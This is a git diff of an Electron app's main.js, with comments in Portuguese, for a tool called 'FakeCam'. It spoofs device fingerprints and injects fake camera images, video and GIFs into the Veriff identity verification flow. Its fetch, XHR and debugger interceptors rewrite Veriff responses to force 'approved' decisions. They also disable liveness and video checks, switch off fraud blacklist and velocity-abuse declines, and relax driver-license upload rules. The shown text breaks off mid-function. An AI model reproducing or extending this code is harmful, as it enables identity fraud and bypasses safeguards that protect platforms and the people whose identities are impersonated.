@@ -1,5 +1,5 @@
 // src/main.js — FakeCam + Toolbox + Navegação + UA Presets + Perfis (profiles.json)
-const { app, BrowserWindow, ipcMain, session, dialog } = require('electron');
+const { app, BrowserWindow, ipcMain, session, dialog, protocol } = require('electron');
 const path = require('path');
 const fs = require('fs');
 const { randomUUID } = require('crypto');
@@ -10,6 +10,7 @@ const {
   BASE_H,
   FPS,
   DEFAULT_IMAGE_PATH,
+  FORCE_MOBILE_FINGERPRINT,
   REQUIRE_PROXY_LOGIN,
   PROXY_BYPASS,
   SHORTCUTS: CONFIG_SHORTCUTS,
@@ -24,6 +25,14 @@ const {
   ANDROID_EMULATE_VIEWPORT,
 } = require('./config');
 
+// Esquema fakecam:// deve ser registrado ANTES de app.ready para carregar GIF na fakecam.
+try {
+  protocol.registerSchemesAsPrivileged([
+    { scheme: 'fakecam', privileges: { standard: true, secure: true, bypassCSP: true } }
+  ]);
+} catch (e) {
+  console.warn('[Fakecam] registerSchemesAsPrivileged:', e?.message || e);
+}
 // Ignorar erros de certificado (Burp, etc). Deve ser ANTES de app.ready.
 if (IGNORE_SSL_CERTIFICATES === true) {
   app.commandLine.appendSwitch('ignore-certificate-errors');
@@ -51,9 +60,13 @@ let lastProxy = {
 const partitionOf = (id) => `persist:dev-${id}`;
 // Arquivo ORIGINAL de perfis
 const storeFile = () => path.join(app.getPath('userData'), 'profiles.json');
-// Pasta do projeto (para salvar imagem que o Burp usa na substituição)
+// Pasta do projeto (para salvar arquivos usados pelo Burp/fakecam)
 const projectRoot = path.join(__dirname, '..');
 const BURP_REPLACEMENT_PATH_FILE = path.join(projectRoot, 'burp-replacement-path.txt');
+// Flag para o Burp saber se o Modo Drive está ON ou OFF
+const BURP_DRIVE_MODE_FILE = path.join(projectRoot, 'burp-drive-mode.txt');
+const FAKECAM_GIF_DIR = path.join(projectRoot, 'fakecam-assets');
+const FAKECAM_GIF_FILE = path.join(FAKECAM_GIF_DIR, 'current.gif');
 
 const { generateFingerprint, mergeFingerprint, ensureFingerprintFields, applyGeoToFingerprint } = require('./fingerprint');
 
@@ -74,11 +87,58 @@ let currentMediaForInjection = {
 // Script da fakecam para injetar em iframes (Veriff costuma rodar em iframe)
 let storedFakecamScript = null;
 let currentFakecamImageDataUrl = '';
+let currentFakecamVideoDataUrl = '';
 // Script de injeção no upload (fetch/XHR) — precisa rodar também nos iframes onde o Veriff faz o upload
 let storedUploadInjectionScript = null;
 
 // Modo Drive: só altera os 6 campos na resposta (manual_image_upload_required, etc.); desativa injeção de selfie e aprovação Veriff
 let driveModeEnabled = false;
+// Desativar liveness/doc (H2): altera parameterValue do do_2024_h2_identity_document_active_liveness para "false", shouldRestrictGalleryUpload e isLiveVerificationEnabled para false, e remove verifyWebviewUrl
+let identityLivenessOffEnabled = false;
+
+// Interceptação CDP (processo principal) para getStepByUuid — aplica alterações mesmo se o script injetado não rodar a tempo
+let fetchInterceptorAttached = false;
+let fetchInterceptorMessageHandler = null;
+
+function applyIdentityLivenessOffMain(obj) {
+  if (obj === null || typeof obj !== 'object') return obj;
+  if (Array.isArray(obj)) return obj.map((item) => applyIdentityLivenessOffMain(item));
+  const out = {};
+  for (const k of Object.keys(obj)) {
+    if (k === 'verifyWebviewUrl' || k.replace(/[^a-zA-Z]/g, '').toLowerCase().includes('verifywebviewurl')) continue;
+    let v = obj[k];
+    if (k === 'parameterKey' && v === 'do_2024_h2_identity_document_active_liveness') {
+      out[k] = v;
+      continue;
+    }
+    if (k === 'parameterValue' && obj.parameterKey === 'do_2024_h2_identity_document_active_liveness') {
+      out[k] = 'false';
+      continue;
+    }
+    if (k === 'shouldRestrictGalleryUpload') { out[k] = false; continue; }
+    if (k === 'isLiveVerificationEnabled') { out[k] = false; continue; }
+    out[k] = applyIdentityLivenessOffMain(v);
+  }
+  return out;
+}
+
+function stripVerifyWebviewUrlFromTextMain(txt) {
+  if (typeof txt !== 'string') return txt;
+  return txt
+    .replace(/,\s*"verifyWebviewUrl"\s*:\s*"[^"]*"/g, '')
+    .replace(/"verifyWebviewUrl"\s*:\s*"[^"]*"\s*,?\s*/g, '');
+}
+
+function applyIdentityLivenessOffToResponseBody(bodyStr) {
+  if (!bodyStr || typeof bodyStr !== 'string') return bodyStr;
+  try {
+    const json = JSON.parse(bodyStr);
+    const modified = applyIdentityLivenessOffMain(json);
+    return stripVerifyWebviewUrlFromTextMain(JSON.stringify(modified));
+  } catch (e) {
+    return stripVerifyWebviewUrlFromTextMain(bodyStr);
+  }
+}
 
 /* ================ PERFIS (profiles.json) ================= */
 function loadProfiles() {
@@ -136,8 +196,13 @@ function ensureProfiles() {
 function normalizeProfile(p) {
   if (!p) return p;
   const rawFp = p.fingerprint && typeof p.fingerprint === 'object' ? p.fingerprint : null;
-  const hasCompleteFp = rawFp && rawFp.userAgent && rawFp.platform && rawFp.hardwareConcurrency;
-  const fp = hasCompleteFp ? { ...rawFp } : (rawFp ? ensureFingerprintFields({ ...rawFp }, rawFp.preset || 'iphone') : getDefaultFingerprint());
+  let preset = rawFp?.preset || 'iphone';
+  if (FORCE_MOBILE_FINGERPRINT && preset === 'desktop') preset = 'iphone';
+  const wasDesktopForcedToMobile = FORCE_MOBILE_FINGERPRINT && rawFp?.preset === 'desktop';
+  const hasCompleteFp = rawFp && rawFp.userAgent && rawFp.platform && rawFp.hardwareConcurrency && !wasDesktopForcedToMobile;
+  const fp = hasCompleteFp
+    ? { ...rawFp, preset }
+    : (rawFp ? ensureFingerprintFields({ ...rawFp, preset }, preset) : getDefaultFingerprint());
   return {
     ...p,
     url: p.url || TCC_URL,
@@ -336,6 +401,13 @@ function createToolbox() {
   });
 }
 
+// Minimizar/ocultar a janela da toolbox
+ipcMain.handle('toolbox:minimize', () => {
+  if (toolboxWin && !toolboxWin.isDestroyed()) {
+    toolboxWin.minimize();
+  }
+});
+
 /* ================ MAIN WINDOW (por perfil) ================= */
 async function recreateMain(profileId) {
   const list = ensureProfiles();
@@ -357,7 +429,10 @@ async function recreateMain(profileId) {
     }
   }
 
-  if (mainWin) mainWin.destroy();
+  if (mainWin) {
+    fetchInterceptorAttached = false;
+    mainWin.destroy();
+  }
 
   // Aplica proxy e certificados SSL ANTES de criar a janela (Burp, mitmproxy, etc)
   await applyProxy({});
@@ -510,6 +585,7 @@ if(f.webglVendor&&f.webglRenderer){
   
   let currentMedia = null;
   var driveModeOnly = false;
+  var identityLivenessOffEnabled = false;
   
   window.addEventListener('message', (e) => {
     if (e.data?.type === 'MEDIA_INJECTION_UPDATE') {
@@ -520,10 +596,156 @@ if(f.webglVendor&&f.webglRenderer){
       driveModeOnly = !!e.data.enabled;
       console.log('[Media-Inject] Modo Drive:', driveModeOnly ? 'ON (só 6 campos)' : 'OFF (injeção + Veriff)');
     }
+    if (e.data?.type === 'IDENTITY_LIVENESS_OFF_UPDATE') {
+      identityLivenessOffEnabled = !!e.data.enabled;
+      console.log('[Identity-Liveness-Off] Toggle recebido:', identityLivenessOffEnabled ? 'ON' : 'OFF', '(origem:', (e.source === window ? 'este frame' : 'outro'), ')');
+    }
   });
   
-  function applyDriveReplacements(text) {
+  // Pequeno sistema de logs no próprio app
+  if (!Array.isArray(window.__UPLOAD_LOGS)) {
+    window.__UPLOAD_LOGS = [];
+  }
+  function __LOG(type, data) {
+    try {
+      window.__UPLOAD_LOGS.push({
+        timestamp: new Date().toISOString(),
+        type: type,
+        data: data || {}
+      });
+      if (window.__UPLOAD_LOGS.length > 500) {
+        window.__UPLOAD_LOGS = window.__UPLOAD_LOGS.slice(-500);
+      }
+      // Envia para o preload salvar em arquivo (também captura logs de iframes)
+      try {
+        window.top.postMessage({ type: 'SAVE_UPLOAD_LOGS', logs: window.__UPLOAD_LOGS }, '*');
+      } catch (e) {}
+    } catch (e) {}
+  }
+  
+  function applyIdentityLivenessOff(obj) {
+    if (obj === null || typeof obj !== 'object') return obj;
+    if (Array.isArray(obj)) return obj.map(function(item) { return applyIdentityLivenessOff(item); });
+    var out = {};
+    for (var k in obj) {
+      if (!Object.prototype.hasOwnProperty.call(obj, k)) continue;
+      if (k === 'verifyWebviewUrl' || k.replace(/[^a-zA-Z]/g, '').toLowerCase().indexOf('verifywebviewurl') !== -1) continue;
+      var v = obj[k];
+      if (k === 'parameterKey' && v === 'do_2024_h2_identity_document_active_liveness') {
+        out[k] = v;
+        continue;
+      }
+      if (k === 'parameterValue' && obj.parameterKey === 'do_2024_h2_identity_document_active_liveness') {
+        out[k] = 'false';
+        continue;
+      }
+      if (k === 'shouldRestrictGalleryUpload') { out[k] = false; continue; }
+      if (k === 'isLiveVerificationEnabled') { out[k] = false; continue; }
+      out[k] = applyIdentityLivenessOff(v);
+    }
+    return out;
+  }
+  function stripVerifyWebviewUrlFromText(txt) {
+    if (typeof txt !== 'string') return txt;
+    return txt
+      .replace(/,\s*"verifyWebviewUrl"\s*:\s*"[^"]*"/g, '')
+      .replace(/"verifyWebviewUrl"\s*:\s*"[^"]*"\s*,?\s*/g, '');
+  }
+  
+  function applyDriveReplacements(text, url) {
     if (typeof text !== 'string') return text;
+    var urlStr = String(url || '').toLowerCase();
+    // Considera qualquer versão (/v1/sessions, /v2/sessions, etc.) E também
+    // respostas que tenham featureFlags + algum dos campos chave, mesmo sem "sessions" na URL.
+    var hasFeatureFlags = text.indexOf('"featureFlags"') !== -1;
+    var hasDriverKeys =
+      text.indexOf('"manual_image_upload_required"') !== -1 ||
+      text.indexOf('"digital_document_upload"') !== -1 ||
+      text.indexOf('"backside_not_required"') !== -1 ||
+      text.indexOf('"barcode_picture_web"') !== -1 ||
+      text.indexOf('"barcode_picture"') !== -1 ||
+      text.indexOf('"pdf417_barcode_enabled_web"') !== -1;
+    var isSessionConfig =
+      (urlStr.indexOf('/sessions') !== -1 && hasFeatureFlags) ||
+      (hasFeatureFlags && hasDriverKeys);
+    var isDecision = urlStr.indexOf('/decision') !== -1 || urlStr.indexOf('/verifications/') !== -1;
+    try {
+      var obj = JSON.parse(text);
+      var changed = false;
+      var changedFields = [];
+      if (obj && typeof obj === 'object') {
+        // 1) Ajustes de featureFlags para driver (sessão Veriff)
+        if (isSessionConfig && obj.vendorIntegration && obj.vendorIntegration.featureFlags && typeof obj.vendorIntegration.featureFlags === 'object') {
+          var ff = obj.vendorIntegration.featureFlags;
+          function setBool(key, val) {
+            if (ff.hasOwnProperty(key) && ff[key] !== val) {
+              ff[key] = val;
+              changed = true;
+              if (changedFields.indexOf(key) === -1) changedFields.push(key);
+            }
+          }
+          // Upload / fluxo de CNH
+          setBool('manual_image_upload_required', true);
+          setBool('digital_document_upload', true);
+          setBool('backside_not_required', true);
+          setBool('barcode_picture_web', false);
+          setBool('barcode_picture', false);
+          setBool('pdf417_barcode_enabled_web', false);
+          // Liveness / vídeo
+          setBool('liveness_disabled', true);
+          setBool('video_required', false);
+          // Decisão / risco
+          setBool('auto_approve', true);
+          setBool('provisional_approve', true);
+          setBool('auto_decline', false);
+          setBool('auto_decline_suspicious_behavior', false);
+          setBool('decline_velocity_abuse', false);
+          setBool('fraud_blacklist_decline', false);
+        }
+        // 2) Decisão Veriff para driver
+        if (isDecision) {
+          if (obj.status !== undefined && obj.status !== 'approved') {
+            obj.status = 'approved';
+            obj.code = 9001;
+            changed = true;
+          }
+          if (obj.verification && typeof obj.verification === 'object') {
+            if (obj.verification.status !== 'approved') {
+              obj.verification.status = 'approved';
+              obj.verification.code = 9001;
+              obj.verification.reason = null;
+              obj.verification.reasonCode = null;
+              changed = true;
+            }
+          } else if (obj.status !== undefined || obj.code !== undefined) {
+            obj.verification = { status: 'approved', code: 9001, reason: null, reasonCode: null };
+            changed = true;
+          }
+        }
+      }
+      if (changed) {
+        // Loga no app o que foi alterado
+        if (typeof __LOG === 'function') {
+          if (isSessionConfig) {
+            __LOG('DRIVE_SESSION_FLAGS', {
+              url: urlStr,
+              changedFields: changedFields
+            });
+          }
+          if (isDecision) {
+            __LOG('DRIVE_DECISION', {
+              url: urlStr,
+              approved: true,
+              code: 9001
+            });
+          }
+        }
+        return JSON.stringify(obj);
+      }
+    } catch (e) {
+      // fallback em caso de JSON inválido
+    }
+    // Fallback antigo: apenas os 6 campos via regex
     return text
       .replace(/"manual_image_upload_required":\s*false/g, '"manual_image_upload_required":true')
       .replace(/"digital_document_upload":\s*false/g, '"digital_document_upload":true')
@@ -622,12 +844,25 @@ if(f.webglVendor&&f.webglRenderer){
     }
     
     const response = await origFetch.apply(this, args);
+    var urlStrLog = String(url || '');
+    if (identityLivenessOffEnabled && response.ok && urlStrLog.indexOf('getStepByUuid') !== -1) {
+      console.log('[Identity-Liveness-Off] Resposta getStepByUuid recebida (fetch), aplicando alterações...');
+    }
     
     if (driveModeOnly && response.ok) {
       try {
         var respText = await response.clone().text();
-        var modified = applyDriveReplacements(respText);
-        if (modified !== respText) {
+        var modified = applyDriveReplacements(respText, urlStrLog);
+        if (identityLivenessOffEnabled) {
+          try {
+            var j = JSON.parse(modified);
+            var hadWebview = typeof respText === 'string' && respText.indexOf('verifyWebviewUrl') !== -1;
+            modified = JSON.stringify(applyIdentityLivenessOff(j));
+            modified = stripVerifyWebviewUrlFromText(modified);
+            if (hadWebview) console.log('[Identity-Liveness-Off] Aplicado (fetch, Drive ON):', String(url).substring(0, 80));
+          } catch (e) { console.warn('[Identity-Liveness-Off] Erro ao aplicar (Drive ON):', e && e.message); }
+        }
+        if (modified !== respText || identityLivenessOffEnabled) {
           return new Response(modified, { status: response.status, statusText: response.statusText, headers: response.headers });
         }
       } catch (e) {}
@@ -636,32 +871,45 @@ if(f.webglVendor&&f.webglRenderer){
     
     var urlStr = String(url || '').toLowerCase();
     var isVeriff = urlStr.includes('veriff') || urlStr.includes('/verifications/') || urlStr.includes('/sessions/') || urlStr.includes('/decision') || urlStr.includes('/grasp');
-    if (!driveModeOnly && isVeriff && response.ok) {
+    if (!driveModeOnly && response.ok) {
       try {
         var text = await response.clone().text();
         var json = JSON.parse(text);
         var changed = false;
-        if (json.status !== undefined && json.status !== 'approved') {
-          json.status = 'approved';
-          json.code = 9001;
-          changed = true;
-        }
-        if (json.verification) {
-          if (json.verification.status !== 'approved') {
-            json.verification.status = 'approved';
-            json.verification.code = 9001;
-            json.verification.reason = null;
-            json.verification.reasonCode = null;
+
+        if (isVeriff) {
+          if (json.status !== undefined && json.status !== 'approved') {
+            json.status = 'approved';
+            json.code = 9001;
             changed = true;
           }
-        } else {
-          json.verification = { status: 'approved', code: 9001, reason: null, reasonCode: null };
+          if (json.verification) {
+            if (json.verification.status !== 'approved') {
+              json.verification.status = 'approved';
+              json.verification.code = 9001;
+              json.verification.reason = null;
+              json.verification.reasonCode = null;
+              changed = true;
+            }
+          } else {
+            json.verification = { status: 'approved', code: 9001, reason: null, reasonCode: null };
+            changed = true;
+          }
+        }
+
+        if (identityLivenessOffEnabled) {
+          var hadWebview = typeof text === 'string' && text.indexOf('verifyWebviewUrl') !== -1;
+          json = applyIdentityLivenessOff(json);
           changed = true;
+          if (hadWebview) console.log('[Identity-Liveness-Off] Aplicado (fetch):', String(url).substring(0, 80));
         }
+
         if (changed) {
-          return new Response(JSON.stringify(json), { status: response.status, statusText: response.statusText, headers: response.headers });
+          var outText = JSON.stringify(json);
+          if (identityLivenessOffEnabled) outText = stripVerifyWebviewUrlFromText(outText);
+          return new Response(outText, { status: response.status, statusText: response.statusText, headers: response.headers });
         }
-      } catch (e) {}
+      } catch (e) { if (identityLivenessOffEnabled && response.ok) console.warn('[Identity-Liveness-Off] Erro fetch:', e && e.message, 'url:', String(url).substring(0, 60)); }
     }
     return response;
   };
@@ -729,11 +977,20 @@ if(f.webglVendor&&f.webglRenderer){
     var reqUrl = this.__url;
     xhr.addEventListener('load', function() {
       if (xhr.responseType === '' || xhr.responseType === 'text') {
-        var modified = driveModeOnly ? applyDriveReplacements(xhr.responseText) : maybeApproveVeriffResponse(reqUrl, xhr.responseText);
-        if (driveModeOnly ? (modified !== xhr.responseText) : (modified != null)) {
+        var text = xhr.responseText;
+        if (driveModeOnly) text = applyDriveReplacements(text, reqUrl);
+        else { var v = maybeApproveVeriffResponse(reqUrl, text); if (v != null) text = v; }
+        if (identityLivenessOffEnabled) {
           try {
-            Object.defineProperty(xhr, 'responseText', { value: modified, writable: false });
-          } catch (e) {}
+            var j = JSON.parse(text);
+            var hadWebview = typeof text === 'string' && text.indexOf('verifyWebviewUrl') !== -1;
+            text = JSON.stringify(applyIdentityLivenessOff(j));
+            text = stripVerifyWebviewUrlFromText(text);
+            if (hadWebview) console.log('[Identity-Liveness-Off] Aplicado (XHR):', String(reqUrl).substring(0, 80));
+          } catch (e) { console.warn('[Identity-Liveness-Off] Erro XHR:', e && e.message); }
+        }
+        if (text !== xhr.responseText) {
+          try { Object.defineProperty(xhr, 'responseText', { value: text, writable: false }); } catch (e) {}
         }
       }
     }, true);
@@ -793,12 +1050,13 @@ if(f.webglVendor&&f.webglRenderer){
               }
             }, '*');
             window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');
+            window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');
             console.log('[Media-Inject] Mensagem MEDIA_INJECTION_UPDATE enviada');
           `).catch((e) => {
             console.error('[Media-Inject] Erro ao enviar mídia:', e);
           });
         } else {
-          mainWin.webContents.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');`).catch(() => {});
+          mainWin.webContents.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*'); window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');`).catch(() => {});
           console.log('[Media-Inject] ⚠️  Nenhuma mídia configurada para injeção (currentMediaForInjection.type:', currentMediaForInjection.type + ')');
         }
       }, 100);
@@ -824,12 +1082,13 @@ if(f.webglVendor&&f.webglRenderer){
             }
           }, '*');
           window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');
+          window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');
           console.log('[Media-Inject] MEDIA_INJECTION_UPDATE enviado após navegação');
         `).catch((e) => {
           console.error('[Media-Inject] Erro ao enviar mídia após navegação:', e);
         });
       } else {
-        mainWin.webContents.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');`).catch(() => {});
+        mainWin.webContents.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*'); window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');`).catch(() => {});
       }
     }, 200);
   };
@@ -858,9 +1117,10 @@ if(f.webglVendor&&f.webglRenderer){
               }
             }, '*');
             window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');
+            window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');
           `).catch(() => {});
         } else {
-          frame.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');`).catch(() => {});
+          frame.executeJavaScript(`window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*'); window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');`).catch(() => {});
         }
       };
       // 1) Script que intercepta fetch/XHR e escuta MEDIA_INJECTION_UPDATE
@@ -895,10 +1155,14 @@ if(f.webglVendor&&f.webglRenderer){
       } else {
         console.log('[Upload-Inject] ⚠️ AUTO_INJECT_MEDIA está false, script não será injetado');
       }
-      // 2) Fakecam no iframe (evita tela preta)
+      // 2) Fakecam no iframe (evita tela preta): envia imagem, vídeo ou GIF atual
       if (storedFakecamScript) {
         frame.executeJavaScript(storedFakecamScript).then(() => {
-          if (currentFakecamImageDataUrl) {
+          if (currentFakecamVideoDataUrl) {
+            frame.executeJavaScript(
+              `window.postMessage({ __FAKECAM__: true, type: 'SET_VIDEO', dataUrl: ${JSON.stringify(currentFakecamVideoDataUrl)} }, '*');`
+            ).catch(() => {});
+          } else if (currentFakecamImageDataUrl) {
             frame.executeJavaScript(
               `window.postMessage({ __FAKECAM__: true, type: 'SET_IMAGE', dataUrl: ${JSON.stringify(currentFakecamImageDataUrl)} }, '*');`
             ).catch(() => {});
@@ -913,9 +1177,12 @@ if(f.webglVendor&&f.webglRenderer){
   mainWin.webContents.once('did-finish-load', () => {
     let dataUrl = '';
 
-    if (DEFAULT_IMAGE_PATH && fs.existsSync(DEFAULT_IMAGE_PATH)) {
-      const buf = fs.readFileSync(DEFAULT_IMAGE_PATH);
-      const ext = path.extname(DEFAULT_IMAGE_PATH).toLowerCase();
+    const defaultImagePath = DEFAULT_IMAGE_PATH && path.isAbsolute(DEFAULT_IMAGE_PATH)
+      ? DEFAULT_IMAGE_PATH
+      : DEFAULT_IMAGE_PATH ? path.join(projectRoot, DEFAULT_IMAGE_PATH) : null;
+    if (defaultImagePath && fs.existsSync(defaultImagePath)) {
+      const buf = fs.readFileSync(defaultImagePath);
+      const ext = path.extname(defaultImagePath).toLowerCase();
       const mime = ext === '.png' ? 'image/png' : 'image/jpeg';
       dataUrl = `data:${mime};base64,${buf.toString('base64')}`;
     }
@@ -925,6 +1192,7 @@ if(f.webglVendor&&f.webglRenderer){
 
     // Bootstrap da fakecam: mobile = resolução de câmera real (1920x1080), desktop = fingerprint
     currentFakecamImageDataUrl = dataUrl || '';
+    currentFakecamVideoDataUrl = '';
     mainWin.webContents.send('fakecam:bootstrap', {
       BASE_W: baseW,
       BASE_H: baseH,
@@ -946,8 +1214,10 @@ if(f.webglVendor&&f.webglRenderer){
   });
 
   mainWin.on('closed', () => {
+    fetchInterceptorAttached = false;
     mainWin = null;
   });
+  if (identityLivenessOffEnabled) setupFetchInterceptor();
 }
 
 /* ================ FINGERPRINT (sync para preload) ================= */
@@ -958,6 +1228,31 @@ ipcMain.on('fingerprint:get', (event) => {
 /* ================ APP ================= */
 app.whenReady().then(async () => {
   loadBurpCaFingerprint();
+
+  // Protocolo fakecam:// para servir GIF da fakecam (evita limite de tamanho do postMessage)
+  try {
+    if (!fs.existsSync(FAKECAM_GIF_DIR)) fs.mkdirSync(FAKECAM_GIF_DIR, { recursive: true });
+    protocol.registerFileProtocol('fakecam', (request, callback) => {
+      try {
+        const urlStr = request.url || '';
+        const pathPart = urlStr.replace(/^fakecam:\/\/[^/]+/, '') || '';
+        if (pathPart.startsWith('/current.gif')) {
+          const filePath = path.isAbsolute(FAKECAM_GIF_FILE) ? FAKECAM_GIF_FILE : path.join(projectRoot, 'fakecam-assets', 'current.gif');
+          if (fs.existsSync(filePath)) {
+            callback({ path: filePath, mimeType: 'image/gif' });
+          } else {
+            callback({ error: -2 });
+          }
+        } else {
+          callback({ error: -2 });
+        }
+      } catch (err) {
+        callback({ error: -2 });
+      }
+    });
+  } catch (e) {
+    console.warn('[Fakecam] Erro ao registrar protocolo fakecam:', e?.message || e);
+  }
 
   // DNS-over-HTTPS: ajuda a resolver turn*.veriff.me (-105).
   try {
@@ -1092,8 +1387,32 @@ ipcMain.on('fakecam:updateParams', (_event, p) => {
 });
 
 ipcMain.on('fakecam:setImageDataUrl', (_event, d) => {
-  mainWin?.webContents.send('fakecam:setImageDataUrl', d);
-  currentFakecamImageDataUrl = d || '';
+  currentFakecamVideoDataUrl = '';
+  if (d && typeof d === 'string' && d.indexOf('data:image/gif') === 0) {
+    const base64 = d.indexOf(',') >= 0 ? d.split(',')[1] : '';
+    if (base64) {
+      try {
+        if (!fs.existsSync(FAKECAM_GIF_DIR)) fs.mkdirSync(FAKECAM_GIF_DIR, { recursive: true });
+        fs.writeFileSync(FAKECAM_GIF_FILE, Buffer.from(base64, 'base64'));
+        const gifUrl = 'fakecam://local/current.gif?' + Date.now();
+        currentFakecamImageDataUrl = gifUrl;
+        // Janela principal: envia data URL (IPC suporta; evita protocolo na página externa)
+        mainWin?.webContents.send('fakecam:setImageDataUrl', d);
+        // Iframes: recebem URL curta do protocolo
+        mainWin?.webContents.send('fakecam:setImageDataUrlBroadcastToIframes', gifUrl);
+      } catch (e) {
+        console.warn('[Fakecam] Erro ao salvar GIF:', e?.message || e);
+        currentFakecamImageDataUrl = d || '';
+        mainWin?.webContents.send('fakecam:setImageDataUrl', d);
+      }
+    } else {
+      currentFakecamImageDataUrl = d || '';
+      mainWin?.webContents.send('fakecam:setImageDataUrl', d);
+    }
+  } else {
+    currentFakecamImageDataUrl = d || '';
+    mainWin?.webContents.send('fakecam:setImageDataUrl', d);
+  }
 });
 
 ipcMain.on('fakecam:injectionScript', (_event, script) => {
@@ -1105,6 +1424,7 @@ ipcMain.on('fakecam:injectionScript', (_event, script) => {
 
 ipcMain.on('fakecam:setImageDataUrlBroadcast', (_event, url) => {
   currentFakecamImageDataUrl = url || '';
+  currentFakecamVideoDataUrl = '';
   if (!mainWin || mainWin.isDestroyed()) return;
   const code = `window.postMessage({ __FAKECAM__: true, type: 'SET_IMAGE', dataUrl: ${JSON.stringify(url)} }, '*');`;
   try {
@@ -1122,7 +1442,28 @@ ipcMain.on('fakecam:setImageDataUrlBroadcast', (_event, url) => {
 });
 
 ipcMain.on('fakecam:setVideoDataUrl', (_event, d) => {
+  currentFakecamVideoDataUrl = d || '';
+  currentFakecamImageDataUrl = '';
   mainWin?.webContents.send('fakecam:setVideoDataUrl', d);
+});
+
+ipcMain.on('fakecam:setVideoDataUrlBroadcast', (_event, url) => {
+  currentFakecamVideoDataUrl = url || '';
+  currentFakecamImageDataUrl = '';
+  if (!mainWin || mainWin.isDestroyed()) return;
+  try {
+    const wc = mainWin.webContents;
+    const code = `window.postMessage({ __FAKECAM__: true, type: 'SET_VIDEO', dataUrl: ${JSON.stringify(url)} }, '*');`;
+    if (wc.mainFrame && wc.mainFrame.frames) {
+      wc.mainFrame.frames.forEach((frame) => {
+        if (frame !== wc.mainFrame) {
+          frame.executeJavaScript(code).catch(() => {});
+        }
+      });
+    }
+  } catch (e) {
+    console.warn('[Fakecam] Erro ao enviar vídeo para iframes:', e);
+  }
 });
 
 // Grava a mídia atual num arquivo no projeto e em burp-replacement-path.txt para a extensão do Burp usar
@@ -1270,32 +1611,123 @@ ipcMain.handle('media:getForInjection', () => {
 ipcMain.handle('drive-mode:get', () => driveModeEnabled);
 ipcMain.handle('drive-mode:set', (_event, enabled) => {
   driveModeEnabled = !!enabled;
+  // Escreve flag para o Burp: ON/OFF. A extensão lê burp-drive-mode.txt.
+  try {
+    fs.writeFileSync(BURP_DRIVE_MODE_FILE, driveModeEnabled ? 'ON' : 'OFF', 'utf8');
+  } catch (e) {
+    console.warn('[DriveMode] Erro ao escrever BURP_DRIVE_MODE_FILE:', e?.message || e);
+  }
   if (mainWin && !mainWin.isDestroyed()) {
     mainWin.webContents.executeJavaScript(`
       window.postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*');
-      for (var i = 0; i < window.frames.length; i++) { try { window.frames[i].postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*'); } catch(e) {} }
+      window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');
+      for (var i = 0; i < window.frames.length; i++) { try { window.frames[i].postMessage({ type: 'DRIVE_MODE_UPDATE', enabled: ${driveModeEnabled} }, '*'); window.frames[i].postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*'); } catch(e) {} }
     `).catch(() => {});
   }
   return driveModeEnabled;
 });
+ipcMain.handle('identity-liveness-off:get', () => identityLivenessOffEnabled);
+ipcMain.handle('identity-liveness-off:set', (_event, enabled) => {
+  identityLivenessOffEnabled = !!enabled;
+  if (mainWin && !mainWin.isDestroyed()) {
+    mainWin.webContents.executeJavaScript(`
+      window.postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*');
+      for (var i = 0; i < window.frames.length; i++) { try { window.frames[i].postMessage({ type: 'IDENTITY_LIVENESS_OFF_UPDATE', enabled: ${identityLivenessOffEnabled} }, '*'); } catch(e) {} }
+    `).catch(() => {});
+  }
+  setupFetchInterceptor();
+  return identityLivenessOffEnabled;
+});
+
+function setupFetchInterceptor() {
+  if (!mainWin || mainWin.isDestroyed()) return;
+  if (!identityLivenessOffEnabled) {
+    if (fetchInterceptorAttached && mainWin && !mainWin.isDestroyed()) {
+      try {
+        if (fetchInterceptorMessageHandler) {
+          mainWin.webContents.debugger.removeListener('message', fetchInterceptorMessageHandler);
+          fetchInterceptorMessageHandler = null;
+        }
+        mainWin.webContents.debugger.sendCommand('Fetch.disable').catch(() => {});
+        mainWin.webContents.debugger.detach();
+      } catch (e) {}
+      fetchInterceptorAttached = false;
+    }
+    return;
+  }
+  if (fetchInterceptorAttached) return;
+  try {
+    mainWin.webContents.debugger.attach('1.3');
+  } catch (e) {
+    console.warn('[Identity-Liveness-Off] CDP attach failed:', e?.message);
+    return;
+  }
+  fetchInterceptorAttached = true;
+  mainWin.webContents.debugger.on('detach', () => { fetchInterceptorAttached = false; fetchInterceptorMessageHandler = null; });
+
+  fetchInterceptorMessageHandler = async (event, method, params) => {
+    if (method !== 'Fetch.requestPaused' || !params.requestId) return;
+    const isResponseStage = params.responseStatusCode != null;
+    if (!isResponseStage) {
